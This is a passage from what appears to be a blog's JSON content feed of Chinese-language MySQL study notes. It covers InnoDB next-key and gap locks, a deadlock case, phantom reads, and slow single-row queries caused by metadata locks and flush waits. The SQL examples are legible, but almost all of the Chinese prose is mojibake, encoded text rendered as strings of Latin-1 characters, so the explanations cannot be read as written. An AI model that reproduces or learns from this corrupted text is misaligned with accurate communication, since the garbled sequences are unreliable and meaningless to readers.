çš„è®°å½•ä¹‹é—´ï¼Œä¹Ÿæ˜¯æœ‰é—´éš™çš„ã€‚ ä¸ºäº†è·Ÿé—´éš™é”çš„å¼€åŒºé—´å½¢å¼è¿›è¡ŒåŒºåˆ«ï¼Œæˆ‘ç”¨ (c=10,id=30) è¿™æ ·çš„å½¢å¼ï¼Œæ¥è¡¨ç¤ºç´¢å¼•ä¸Šçš„ä¸€è¡Œã€‚ æ¡ˆä¾‹å…­ä½¿ç”¨ delete è¯­å¥æ¥éªŒè¯ã€‚delete è¯­å¥åŠ é”çš„é€»è¾‘ï¼Œå…¶å®è·Ÿ select â€¦ for update æ˜¯ç±»ä¼¼çš„ï¼Œä¹Ÿæ˜¯éµå®ˆä¸¤ä¸ªâ€åŸåˆ™â€œã€ä¸¤ä¸ªâ€ä¼˜åŒ–â€œä»¥åŠä¸€ä¸ªâ€bugâ€œã€‚ è¿™æ—¶ï¼Œsession A åœ¨éå†çš„æ—¶å€™ï¼Œå…ˆè®¿é—®ç¬¬ä¸€ä¸ª c=10 çš„è®°å½•ã€‚åŒæ ·åœ°ï¼Œæ ¹æ®åŸåˆ™ 1ï¼Œè¿™é‡ŒåŠ çš„æ˜¯ (c=5,id=5) åˆ° (c=10,id=10) è¿™ä¸ª next-key lockã€‚ ç„¶åï¼Œsession A å‘å³æŸ¥æ‰¾ï¼Œç›´åˆ°ç¢°åˆ° (c=15,id=15) è¿™ä¸€è¡Œï¼Œå¾ªç¯æ‰ç»“æŸã€‚æ ¹æ®ä¼˜åŒ– 2ï¼Œè¿™æ˜¯ä¸€ä¸ªç­‰å€¼æŸ¥è¯¢ï¼Œå‘å³æŸ¥æ‰¾åˆ°äº†ä¸æ»¡è¶³æ¡ä»¶çš„è¡Œï¼Œæ‰€ä»¥ä¼šé€€åŒ–æˆ (c=10,id=10) åˆ° (c=15,id=15) çš„é—´éš™é”ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ª delete è¯­å¥åœ¨ç´¢å¼• c ä¸Šçš„åŠ é”èŒƒå›´ï¼Œå°±æ˜¯ä¸‹å›¾ä¸­è“è‰²åŒºåŸŸè¦†ç›–çš„éƒ¨åˆ†ã€‚ è¿™ä¸ªè“è‰²åŒºåŸŸå·¦å³ä¸¤è¾¹éƒ½æ˜¯è™šçº¿ï¼Œè¡¨ç¤ºå¼€åŒºé—´ï¼Œå³ (c=5,id=5) å’Œ (c=15,id=15) è¿™ä¸¤è¡Œä¸Šéƒ½æ²¡æœ‰é”ã€‚ æ¡ˆä¾‹ä¸ƒï¼šlimit è¯­å¥åŠ é”æ¡ˆä¾‹å…­çš„å¯¹ç…§æ¡ˆä¾‹ï¼š è¿™ä¸ªä¾‹å­é‡Œï¼Œsession A çš„ delete è¯­å¥åŠ äº† limit 2ã€‚ä½ çŸ¥é“è¡¨ t é‡Œ c=10 çš„è®°å½•å…¶å®åªæœ‰ä¸¤æ¡ï¼Œå› æ­¤åŠ ä¸åŠ  limit 2ï¼Œåˆ é™¤çš„æ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯åŠ é”çš„æ•ˆæœå´ä¸åŒã€‚å¯ä»¥çœ‹åˆ°ï¼Œsession B çš„ insert è¯­å¥æ‰§è¡Œé€šè¿‡äº†ï¼Œè·Ÿæ¡ˆä¾‹å…­çš„ç»“æœä¸åŒã€‚ è¿™æ˜¯å› ä¸ºï¼Œæ¡ˆä¾‹ä¸ƒé‡Œçš„ delete è¯­å¥æ˜ç¡®åŠ äº† limit 2 çš„é™åˆ¶ï¼Œå› æ­¤åœ¨éå†åˆ° (c=10, id=30) è¿™ä¸€è¡Œä¹‹åï¼Œæ»¡è¶³æ¡ä»¶çš„è¯­å¥å·²ç»æœ‰ä¸¤æ¡ï¼Œå¾ªç¯å°±ç»“æŸäº†ã€‚ ä¹Ÿå°±æ˜¯å¦‚æœè¿™é‡Œçš„ delete è¯­å¥æ²¡æœ‰åŠ ä¸Š limit 2 è¿™ä¸ªé™åˆ¶ï¼Œåé¢çš„ insert è¯­å¥æ˜¯ä¼šè¢«é”ä½çš„ï¼Œå› ä¸ºc æ˜¯æ™®é€šç´¢å¼•ï¼Œå› æ­¤ä»…è®¿é—® c=10 è¿™ä¸€æ¡è®°å½•æ˜¯ä¸èƒ½é©¬ä¸Šåœä¸‹æ¥çš„ï¼Œéœ€è¦å‘å³éå†ï¼ŒæŸ¥åˆ° c=15 æ‰æ”¾å¼ƒã€‚æ ¹æ®åŸåˆ™ 2ï¼Œè®¿é—®åˆ°çš„éƒ½è¦åŠ é”ï¼Œå› æ­¤è¦ç»™ (10,15] åŠ  next-key lockã€‚ å› æ­¤ï¼Œç´¢å¼• c ä¸Šçš„åŠ é”èŒƒå›´å°±å˜æˆäº†ä»ï¼ˆc=5,id=5) åˆ°ï¼ˆc=10,id=30) è¿™ä¸ªå‰å¼€åé—­åŒºé—´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°ï¼Œ(c=10,id=30ï¼‰ä¹‹åçš„è¿™ä¸ªé—´éš™å¹¶æ²¡æœ‰åœ¨åŠ é”èŒƒå›´é‡Œï¼Œå› æ­¤ insert è¯­å¥æ’å…¥ c=12 æ˜¯å¯ä»¥æ‰§è¡ŒæˆåŠŸçš„ã€‚ è¿™ä¸ªä¾‹å­å¯¹æˆ‘ä»¬å®è·µçš„æŒ‡å¯¼æ„ä¹‰å°±æ˜¯ï¼Œåœ¨åˆ é™¤æ•°æ®çš„æ—¶å€™å°½é‡åŠ  limitã€‚è¿™æ ·ä¸ä»…å¯ä»¥æ§åˆ¶åˆ é™¤æ•°æ®çš„æ¡æ•°ï¼Œè®©æ“ä½œæ›´å®‰å…¨ï¼Œè¿˜å¯ä»¥å‡å°åŠ é”çš„èŒƒå›´ã€‚ æ¡ˆä¾‹å…«ï¼šä¸€ä¸ªæ­»é”çš„ä¾‹å­next-key lock å®é™…ä¸Šæ˜¯é—´éš™é”å’Œè¡Œé”åŠ èµ·æ¥çš„ç»“æœã€‚ session A å¯åŠ¨äº‹åŠ¡åæ‰§è¡ŒæŸ¥è¯¢è¯­å¥åŠ  lock in share modeï¼Œåœ¨ç´¢å¼• c ä¸ŠåŠ äº† next-key lock(5,10] å’Œé—´éš™é” (10,15)ï¼› session B çš„ update è¯­å¥ä¹Ÿè¦åœ¨ç´¢å¼• c ä¸ŠåŠ  next-key lock(5,10] ï¼Œè¿›å…¥é”ç­‰å¾…ï¼› ç„¶å session A è¦å†æ’å…¥ (8,8,8) è¿™ä¸€è¡Œï¼Œè¢« session B çš„é—´éš™é”é”ä½ã€‚ç”±äºå‡ºç°äº†æ­»é”ï¼ŒInnoDB è®© session B å›æ»šã€‚ ä½ å¯èƒ½ä¼šé—®ï¼Œsession B çš„ next-key lock ä¸æ˜¯è¿˜æ²¡ç”³è¯·æˆåŠŸå—ï¼Ÿ å…¶å®æ˜¯è¿™æ ·çš„ï¼Œsession B çš„â€œåŠ  next-key lock(5,10] â€æ“ä½œï¼Œå®é™…ä¸Šåˆ†æˆäº†ä¸¤æ­¥ï¼Œå…ˆæ˜¯åŠ  (5,10) çš„é—´éš™é”ï¼ŒåŠ é”æˆåŠŸï¼›ç„¶ååŠ  c=10 çš„è¡Œé”ï¼Œè¿™æ—¶å€™æ‰è¢«é”ä½çš„ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨åˆ†æåŠ é”è§„åˆ™çš„æ—¶å€™å¯ä»¥ç”¨ next-key lock æ¥åˆ†æã€‚ä½†æ˜¯è¦çŸ¥é“ï¼Œå…·ä½“æ‰§è¡Œçš„æ—¶å€™ï¼Œæ˜¯è¦åˆ†æˆé—´éš™é”å’Œè¡Œé”ä¸¤æ®µæ¥æ‰§è¡Œçš„ã€‚ æ€»ç»“ lock in share mode åªé”è¦†ç›–ç´¢å¼•; for update ä¼šç»™ä¸»é”®ç´¢å¼•ä¸Šæ»¡è¶³æ¡ä»¶çš„è¡ŒåŠ ä¸Šè¡Œé” next-key lock å®é™…ä¸Šæ˜¯ç”±é—´éš™é”åŠ è¡Œé”å®ç°çš„ å¯é‡å¤è¯»éš”ç¦»çº§åˆ«éµå®ˆä¸¤é˜¶æ®µé”åè®®ï¼Œæ‰€æœ‰åŠ é”çš„èµ„æºï¼Œéƒ½æ˜¯åœ¨äº‹åŠ¡æäº¤æˆ–è€…å›æ»šçš„æ—¶å€™æ‰é‡Šæ”¾çš„","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"20 å¹»è¯»æ˜¯ä»€ä¹ˆï¼Œå¹»è¯»æœ‰ä»€ä¹ˆé—®é¢˜","slug":"what-is-phantom-reading-and-what-s-wrong-with-phantom-reading","date":"2022-08-15T07:28:40.000Z","updated":"2023-02-18T03:28:33.607Z","comments":true,"path":"what-is-phantom-reading-and-what-s-wrong-with-phantom-reading/","link":"","permalink":"https://www.0x2beace.com/what-is-phantom-reading-and-what-s-wrong-with-phantom-reading/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£å…¨è¡¨æ‰«çŒ«çš„åŠ é”æ–¹å¼ è®¤è¯†å¹»è¯» äº†è§£å¹»è¯»æ‰€å¸¦æ¥çš„é—®é¢˜ä»¥åŠå¦‚ä½•è§£å†³å¹»è¯»","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£å…¨è¡¨æ‰«çŒ«çš„åŠ é”æ–¹å¼ è®¤è¯†å¹»è¯» äº†è§£å¹»è¯»æ‰€å¸¦æ¥çš„é—®é¢˜ä»¥åŠå¦‚ä½•è§£å†³å¹»è¯» ä¸‹é¢çš„ç¤ºä¾‹éƒ½æ˜¯åŸºäºè¡¨ t è¿›è¡Œå±•å¼€çš„ï¼Œå»ºè¡¨å’Œåˆå§‹åŒ–è¯­å¥å¦‚ä¸‹ï¼š 12345678910CREATE TABLE &#96;t&#96; ( &#96;id&#96; int(11) NOT NULL, &#96;c&#96; int(11) DEFAULT NULL, &#96;d&#96; int(11) DEFAULT NULL, PRIMARY KEY (&#96;id&#96;), KEY &#96;c&#96; (&#96;c&#96;)) ENGINE&#x3D;InnoDB; insert into t values(0,0,0),(5,5,5),(10,10,10),(15,15,15),(20,20,20),(25,25,25); å¹»è¯»æ˜¯ä»€ä¹ˆä¸‹é¢çš„è¯­å¥åºåˆ—ï¼Œæ˜¯æ€ä¹ˆåŠ é”çš„ï¼ŒåŠ çš„é”åˆæ˜¯ä»€ä¹ˆæ—¶å€™é‡Šæ”¾çš„å‘¢ï¼Ÿ 123begin;select * from t where d&#x3D;5 for update;commit; è¿™ä¸ªè¯­å¥ä¼šå‘½ä¸­ d=5 çš„è¿™ä¸€è¡Œï¼Œå¯¹åº”çš„ä¸»é”® id=5ï¼Œå› æ­¤åœ¨ select è¯­å¥æ‰§è¡Œå®Œæˆåï¼Œid=5 è¿™ä¸€è¡Œä¼šåŠ ä¸€ä¸ªå†™é”ï¼Œè€Œä¸”ç”±äºä¸¤é˜¶æ®µé”åè®®ï¼Œè¿™ä¸ªå†™é”ä¼šåœ¨æ‰§è¡Œ commit è¯­å¥çš„æ—¶å€™é‡Šæ”¾ã€‚ ç”±äºå­—æ®µ d ä¸Šæ²¡æœ‰ç´¢å¼•ï¼Œå› æ­¤è¿™æ¡æŸ¥è¯¢è¯­å¥ä¼šåšå…¨è¡¨æ‰«æã€‚é‚£ä¹ˆï¼Œå…¶ä»–è¢«æ‰«æåˆ°çš„ï¼Œä½†ä¸æ»¡è¶³æ¡ä»¶ d=5 çš„è®°å½•ï¼Œä¼šä¸ä¼šè¢«åŠ é”å‘¢ã€‚ ç­”æ¡ˆæ˜¯ï¼Œä¹Ÿä¼šè¢«é”ä½ã€‚ å¹»è¯»æŒ‡çš„æ˜¯ä¸€ä¸ªäº‹åŠ¡åœ¨å‰åä¸¤æ¬¡æŸ¥è¯¢åŒä¸€ä¸ªèŒƒå›´çš„æ—¶å€™ï¼Œåä¸€æ¬¡æŸ¥è¯¢çœ‹åˆ°äº†å‰ä¸€æ¬¡æŸ¥è¯¢æ²¡æœ‰çœ‹åˆ°çš„è¡Œã€‚ å¹»è¯»æœ‰ä»€ä¹ˆé—®é¢˜å‡è®¾åªåœ¨ id=5 è¿™ä¸€è¡ŒåŠ è¡Œé”ï¼Œä¼šäº§ç”Ÿæ•°æ®ä¸€è‡´æ€§é—®é¢˜ã€‚ æˆ‘ä»¬æŠŠæ‰«æè¿‡ç¨‹ä¸­ç¢°åˆ°çš„è¡Œï¼Œä¹Ÿéƒ½åŠ ä¸Šå†™é”ï¼Œå†æ¥çœ‹çœ‹æ‰§è¡Œæ•ˆæœã€‚ ç”±äº session A æŠŠæ‰€æœ‰çš„è¡Œéƒ½åŠ äº†å†™é”ï¼Œæ‰€ä»¥ session B åœ¨æ‰§è¡Œç¬¬ä¸€ä¸ª update è¯­å¥çš„æ—¶å€™å°±è¢«é”ä½äº†ã€‚éœ€è¦ç­‰åˆ° T6 æ—¶åˆ» session A æäº¤ä»¥åï¼Œsession B æ‰èƒ½ç»§ç»­æ‰§è¡Œã€‚ è¿™æ ·å¯¹äº id=0 è¿™ä¸€è¡Œï¼Œåœ¨æ•°æ®åº“é‡Œçš„æœ€ç»ˆç»“æœè¿˜æ˜¯ (0,5,5)ã€‚åœ¨ binlog é‡Œé¢ï¼Œæ‰§è¡Œåºåˆ—æ˜¯è¿™æ ·çš„ï¼š 1234567insert into t values(1,1,5); &#x2F;*(1,1,5)*&#x2F;update t set c&#x3D;5 where id&#x3D;1; &#x2F;*(1,5,5)*&#x2F; update t set d&#x3D;100 where d&#x3D;5;&#x2F;* æ‰€æœ‰ d&#x3D;5 çš„è¡Œï¼Œd æ”¹æˆ 100*&#x2F; update t set d&#x3D;5 where id&#x3D;0; &#x2F;*(0,0,5)*&#x2F;update t set c&#x3D;5 where id&#x3D;0; &#x2F;*(0,5,5)*&#x2F; ä½†åŒæ—¶ä½ ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œid=1 è¿™ä¸€è¡Œï¼Œåœ¨æ•°æ®åº“é‡Œé¢çš„ç»“æœæ˜¯ (1,5,5)ï¼Œè€Œæ ¹æ® binlog çš„æ‰§è¡Œç»“æœæ˜¯ (1,5,100)ï¼Œä¹Ÿå°±æ˜¯è¯´å¹»è¯»çš„é—®é¢˜è¿˜æ˜¯æ²¡æœ‰è§£å†³ã€‚ä¸ºä»€ä¹ˆæˆ‘ä»¬å·²ç»è¿™ä¹ˆâ€œå‡¶æ®‹â€åœ°ï¼ŒæŠŠæ‰€æœ‰çš„è®°å½•éƒ½ä¸Šäº†é”ï¼Œè¿˜æ˜¯é˜»æ­¢ä¸äº† id=1 è¿™ä¸€è¡Œçš„æ’å…¥å’Œæ›´æ–°å‘¢ï¼Ÿ åŸå› å¾ˆç®€å•ã€‚åœ¨ T3 æ—¶åˆ»ï¼Œæˆ‘ä»¬ç»™æ‰€æœ‰è¡ŒåŠ é”çš„æ—¶å€™ï¼Œid=1 è¿™ä¸€è¡Œè¿˜ä¸å­˜åœ¨ï¼Œä¸å­˜åœ¨ä¹Ÿå°±åŠ ä¸ä¸Šé”ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿æŠŠæ‰€æœ‰çš„è®°å½•éƒ½åŠ ä¸Šé”ï¼Œè¿˜æ˜¯é˜»æ­¢ä¸äº†æ–°æ’å…¥çš„è®°å½•ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆâ€œå¹»è¯»â€ä¼šè¢«å•ç‹¬æ‹¿å‡ºæ¥è§£å†³çš„åŸå› ã€‚ å¹»è¯»æ€ä¹ˆè§£å†³äº§ç”Ÿå¹»è¯»çš„åŸå› æ˜¯ï¼Œè¡Œé”åªèƒ½é”ä½è¡Œï¼Œä½†æ˜¯æ–°æ’å…¥è®°å½•è¿™ä¸ªåŠ¨ä½œï¼Œè¦æ›´æ–°çš„æ˜¯è®°å½•ä¹‹é—´çš„â€œé—´éš™â€ã€‚å› æ­¤ï¼Œä¸ºäº†è§£å†³å¹»è¯»é—®é¢˜ï¼ŒInnoDB åªå¥½å¼•å…¥æ–°çš„é”ï¼Œä¹Ÿå°±æ˜¯é—´éš™é” (Gap Lock)ã€‚ é¡¾åæ€ä¹‰ï¼Œé—´éš™é”ï¼Œé”çš„å°±æ˜¯ä¸¤ä¸ªå€¼ä¹‹é—´çš„ç©ºéš™ã€‚æ¯”å¦‚æ–‡ç« å¼€å¤´çš„è¡¨ tï¼Œåˆå§‹åŒ–æ’å…¥äº† 6 ä¸ªè®°å½•ï¼Œè¿™å°±äº§ç”Ÿäº† 7 ä¸ªé—´éš™ã€‚ è¿™æ ·ï¼Œå½“æ‰§è¡Œ select * from t where d=5 for update çš„æ—¶å€™ï¼Œå°±ä¸æ­¢æ˜¯ç»™æ•°æ®åº“ä¸­å·²æœ‰çš„ 6 ä¸ªè®°å½•åŠ ä¸Šäº†è¡Œé”ï¼Œè¿˜åŒæ—¶åŠ äº† 7 ä¸ªé—´éš™é”ã€‚è¿™æ ·å°±ç¡®ä¿äº†æ— æ³•å†æ’å…¥æ–°çš„è®°å½•ã€‚ é—´éš™é”å’Œè¡Œé”åˆç§° next-key lockï¼Œæ¯ä¸ª next-key lock æ˜¯å‰å¼€åé—­åŒºé—´ã€‚ ä¹Ÿå°±æ˜¯è¯´è¿™æ—¶å€™ï¼Œåœ¨ä¸€è¡Œè¡Œæ‰«æçš„è¿‡ç¨‹ä¸­ï¼Œä¸ä»…å°†ç»™è¡ŒåŠ ä¸Šäº†è¡Œé”ï¼Œè¿˜ç»™è¡Œä¸¤è¾¹çš„ç©ºéš™ï¼Œä¹ŸåŠ ä¸Šäº†é—´éš™é”ã€‚ ç°åœ¨ä½ çŸ¥é“äº†ï¼Œæ•°æ®è¡Œæ˜¯å¯ä»¥åŠ ä¸Šé”çš„å®ä½“ï¼Œæ•°æ®è¡Œä¹‹é—´çš„é—´éš™ï¼Œä¹Ÿæ˜¯å¯ä»¥åŠ ä¸Šé”çš„å®ä½“ã€‚ä½†æ˜¯é—´éš™é”è·Ÿæˆ‘ä»¬ä¹‹å‰ç¢°åˆ°è¿‡çš„é”éƒ½ä¸å¤ªä¸€æ ·ã€‚ æ¯”å¦‚è¡Œé”ï¼Œåˆ†æˆè¯»é”å’Œå†™é”ã€‚ä¸‹å›¾å°±æ˜¯è¿™ä¸¤ç§ç±»å‹è¡Œé”çš„å†²çªå…³ç³»ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè·Ÿè¡Œé”æœ‰å†²çªå…³ç³»çš„æ˜¯â€œå¦å¤–ä¸€ä¸ªè¡Œé”â€ã€‚ ä½†æ˜¯é—´éš™é”ä¸ä¸€æ ·ï¼Œè·Ÿé—´éš™é”å­˜åœ¨å†²çªå…³ç³»çš„ï¼Œæ˜¯â€œå¾€è¿™ä¸ªé—´éš™ä¸­æ’å…¥ä¸€ä¸ªè®°å½•â€è¿™ä¸ªæ“ä½œã€‚é—´éš™é”ä¹‹é—´éƒ½ä¸å­˜åœ¨å†²çªå…³ç³»ã€‚ é—´éš™é”çš„å¼•å…¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´åŒæ ·çš„è¯­å¥é”ä½æ›´å¤§çš„èŒƒå›´ï¼Œè¿™å…¶å®æ˜¯å½±å“äº†å¹¶å‘åº¦çš„ã€‚ æ€»ç»“ select * from t where d=5 for update;ï¼Œç”±äºå­—æ®µ d ä¸Šæ²¡æœ‰ç´¢å¼•ï¼Œå› æ­¤è¿™æ¡æŸ¥è¯¢è¯­å¥ä¼šåšå…¨è¡¨æ‰«æã€‚ä¸æ»¡è¶³æ¡ä»¶ d= 5 çš„è®°å½•ï¼Œä¹Ÿä¼šè¢«åŠ é”ï¼Œå› ä¸ºå¦‚æœä¸åŠ é”çš„è¯ï¼Œä¼šäº§ç”Ÿå¹»è¯»ã€‚ å¹»è¯»æ˜¯æŒ‡ä¸€ä¸ªäº‹åŠ¡åœ¨å‰åä¸¤æ¬¡æŸ¥è¯¢åŒä¸€ä¸ªèŒƒå›´çš„æ—¶å€™ï¼Œåä¸€æ¬¡æŸ¥è¯¢çœ‹åˆ°äº†å‰ä¸€æ¬¡æŸ¥è¯¢æ²¡æœ‰çœ‹åˆ°çš„è¡Œã€‚ å¹»è¯»æ‰€å¸¦æ¥çš„é—®é¢˜å°±æ˜¯ï¼Œæ•°æ®ä¸€è‡´æ€§è¢«ç ´åï¼Œæ•°æ®å’Œæ—¥å¿—åœ¨é€»è¾‘ä¸Šä¸ä¸€è‡´ã€‚ è§£å†³å¹»è¯»çš„æ–¹å¼æ˜¯ï¼Œå¼•å…¥é—´éš™é”ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"19 ä¸ºä»€ä¹ˆæˆ‘åªæŸ¥ä¸€è¡Œçš„è¯­å¥ï¼Œä¹Ÿæ‰§è¡Œè¿™ä¹ˆæ…¢","slug":"why-do-I-only-check-one-line-of-the-statement-but-also-execute-so-slowly","date":"2022-08-13T05:05:27.000Z","updated":"2023-02-18T03:28:33.609Z","comments":true,"path":"why-do-I-only-check-one-line-of-the-statement-but-also-execute-so-slowly/","link":"","permalink":"https://www.0x2beace.com/why-do-I-only-check-one-line-of-the-statement-but-also-execute-so-slowly/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£åªæŸ¥ä¸€è¡Œè®°å½•ï¼Œä¹Ÿä¼šæ‰§è¡Œå¾—ç‰¹åˆ«æ…¢çš„å¤šç§æƒ…å†µ","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£åªæŸ¥ä¸€è¡Œè®°å½•ï¼Œä¹Ÿä¼šæ‰§è¡Œå¾—ç‰¹åˆ«æ…¢çš„å¤šç§æƒ…å†µ æœ‰æ—¶å€™ï¼Œåœ¨ Mysql ä¸­ï¼ŒåªæŸ¥ä¸€è¡Œè®°å½•ï¼Œä¹Ÿä¼šæ‰§è¡Œå¾—ç‰¹åˆ«æ…¢ã€‚ å½“ç„¶ä¸Šé¢è¯´çš„è¿™ä¸ªé—®é¢˜ï¼Œè‚¯å®šä¸æ˜¯åœ¨ MySQL æ•°æ®åº“æœ¬èº«å°±æœ‰å¾ˆå¤§çš„å‹åŠ›ï¼Œå¯¼è‡´æ•°æ®åº“æœåŠ¡å™¨ CPU å ç”¨ç‡å¾ˆé«˜æˆ– ioutilï¼ˆIO åˆ©ç”¨ç‡ï¼‰å¾ˆé«˜ï¼Œè¿™ç§æƒ…å†µä¸‹æ‰€æœ‰è¯­å¥çš„æ‰§è¡Œéƒ½æœ‰å¯èƒ½å˜æ…¢ã€‚ ä¸ºäº†ä¾¿äºæè¿°ï¼Œæˆ‘è¿˜æ˜¯æ„é€ ä¸€ä¸ªè¡¨ï¼ŒåŸºäºè¿™ä¸ªè¡¨æ¥è¯´æ˜ä»Šå¤©çš„é—®é¢˜ã€‚è¿™ä¸ªè¡¨æœ‰ä¸¤ä¸ªå­—æ®µ id å’Œ cï¼Œå¹¶ä¸”æˆ‘åœ¨é‡Œé¢æ’å…¥äº† 10 ä¸‡è¡Œè®°å½•ã€‚ 12345678910111213141516171819CREATE TABLE &#96;t&#96; ( &#96;id&#96; int(11) NOT NULL, &#96;c&#96; int(11) DEFAULT NULL, PRIMARY KEY (&#96;id&#96;)) ENGINE&#x3D;InnoDB; delimiter ;;create procedure idata()begin declare i int; set i&#x3D;1; while(i&lt;&#x3D;100000)do insert into t values(i,i); set i&#x3D;i+1; end while;end;;delimiter ; call idata(); ç¬¬ä¸€ç±»ï¼šæŸ¥è¯¢é•¿æ—¶é—´ä¸è¿”å›å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨è¡¨ t æ‰§è¡Œä¸‹é¢çš„ SQL è¯­å¥ï¼š 1select * from t where id&#x3D;1; æŸ¥è¯¢ç»“æœé•¿æ—¶é—´ä¸è¿”å›ã€‚ ä¸€èˆ¬ç¢°åˆ°è¿™ç§æƒ…å†µçš„è¯ï¼Œå¤§æ¦‚ç‡æ˜¯è¡¨ t è¢«é”ä½äº†ã€‚æ¥ä¸‹æ¥åˆ†æåŸå› çš„æ—¶å€™ï¼Œä¸€èˆ¬éƒ½æ˜¯é¦–å…ˆæ‰§è¡Œä¸€ä¸‹ show processlist å‘½ä»¤ï¼Œçœ‹çœ‹å½“å‰è¯­å¥å¤„äºä»€ä¹ˆçŠ¶æ€ã€‚ ç„¶åæˆ‘ä»¬å†é’ˆå¯¹æ¯ç§çŠ¶æ€ï¼Œå»åˆ†æå®ƒä»¬äº§ç”Ÿçš„åŸå› ã€å¦‚ä½•å¤ç°ï¼Œä»¥åŠå¦‚ä½•å¤„ç†ã€‚ ç­‰ MDL é”é€šå¸¸å‰é¢çš„å­¦ä¹ å¾—çŸ¥ï¼ŒMDL é”æ˜¯å¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ªè¡¨é”ä½çš„ï¼ˆå¢åˆ æ”¹æŸ¥éƒ½åšä¸äº†ï¼‰ã€‚ å¤ç°è¿‡ç¨‹ï¼š å¼€å¯ä¸€ä¸ªäº‹åŠ¡ A ï¼Œå¯¹è¡¨ t åŠ ä¸€ä¸ª MDL è¯»é”ï¼ˆå¯¹è¡¨ t åšå¢åˆ æ”¹æŸ¥ï¼‰ å¼€å¯ä¸€ä¸ªäº‹åŠ¡ Bï¼Œå¯¹è¡¨ t åŠ ä¸€ä¸ª MDL å†™é”ï¼ˆå¯¹è¡¨ t å¢åŠ ä¸€ä¸ªå­—æ®µï¼‰ æ­¤æ—¶ session A å¼€å¯äº†äº‹åŠ¡ï¼Œå¹¶æ²¡æœ‰é‡Šæ”¾ï¼Œè€Œ session B éœ€è¦ MDL å†™é”ï¼Œå› æ­¤åªèƒ½è¢«é˜»å¡ï¼ˆé˜»å¡åŸå› ï¼šMDL è¯»å†™é”æ˜¯äº’æ–¥çš„ï¼‰ æ­¤æ—¶çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯ï¼Œä½¿ç”¨ show processlist å‘½ä»¤æŸ¥çœ‹ Waiting for table metadata lockã€‚ æ‰¾å‡ºé€ æˆé˜»å¡çš„ process idï¼ŒæŠŠè¿™ä¸ªè¿æ¥ç”¨ kill å‘½ä»¤æ–­å¼€å³å¯ã€‚ ç­‰ flushMySQL ä¸­å¯¹è¡¨åš flush æ“ä½œçš„ç”¨æ³•ï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸¤ä¸ªï¼š flush tables t with read lock; flush tables with read lock; è¿™ä¸¤ä¸ª flush è¯­å¥ï¼Œå¦‚æœæŒ‡å®šè¡¨ t çš„è¯ï¼Œä»£è¡¨çš„æ˜¯åªå…³é—­è¡¨ tï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šå…·ä½“çš„è¡¨åï¼Œåˆ™è¡¨ç¤ºå…³é—­ MySQL é‡Œæ‰€æœ‰æ‰“å¼€çš„è¡¨ã€‚ ä½†æ˜¯æ­£å¸¸è¿™ä¸¤ä¸ªè¯­å¥æ‰§è¡Œèµ·æ¥éƒ½å¾ˆå¿«ï¼Œé™¤éå®ƒä»¬ä¹Ÿè¢«åˆ«çš„çº¿ç¨‹å µä½äº†ã€‚ æ‰€ä»¥ï¼Œå‡ºç° Waiting for table flush çŠ¶æ€çš„å¯èƒ½æƒ…å†µæ˜¯ï¼šæœ‰ä¸€ä¸ª flush tables å‘½ä»¤è¢«åˆ«çš„è¯­å¥å µä½äº†ï¼Œç„¶åå®ƒåˆå µä½äº†æˆ‘ä»¬çš„ select è¯­å¥ã€‚ é‡ç°æ­¥éª¤ï¼š 